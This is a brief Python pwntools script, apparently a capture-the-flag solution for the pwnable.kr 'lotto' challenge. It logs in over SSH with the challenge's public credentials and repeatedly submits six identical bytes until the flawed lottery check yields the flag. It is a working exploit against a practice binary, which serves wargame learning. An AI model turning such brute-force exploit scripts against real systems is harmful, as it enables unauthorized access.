from pwn import *
#context.log_level = 'debug'

cn = ssh(host='pwnable.kr',user='lotto',password='guest',port=2222).process("./lotto")
while 1:
	cn.recv()
	cn.sendline('1')
	cn.recv()
	cn.send('!!!!!!')
	cn.recvline()
	ret = cn.recvline()
	if ret == 'bad luck...\n':
		continue
	print ret
	break
	